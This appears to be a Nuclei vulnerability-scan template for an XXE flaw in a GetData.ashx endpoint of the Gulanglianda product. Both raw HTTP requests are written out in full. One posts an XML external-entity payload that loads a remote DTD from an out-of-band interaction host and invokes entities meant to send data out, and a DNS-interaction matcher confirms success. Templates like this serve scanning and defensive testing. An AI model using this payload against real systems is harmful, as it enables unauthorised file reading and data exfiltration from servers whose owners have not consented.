id: gulanglianda-GetData-xxe

info:
  name: gulanglianda-GetData-xxe
  author: gulanglianda-GetData-xxe
  severity: high



http:
  - raw:
      - |
        POST /GTP/IM/Services/Group/Broadcast/ajax/GetData.ashx HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Cookie: GTP_IdServer_LangID=2052
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        os=PubBroadcast&XmlData=<!DOCTYPE convert [
        <!ENTITY % remote SYSTEM "http://{{interactsh-url}}">
        %remote;%int;%send;
        ]>


      - |
        POST /GTP/IM/Services/Group/Broadcast/ajax/GetData.ashx HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Cookie: GTP_IdServer_LangID=2052
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        os=GetSerchGridData&queryString=&pageIndex=1&ImUserId=1&PageSize=1


    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"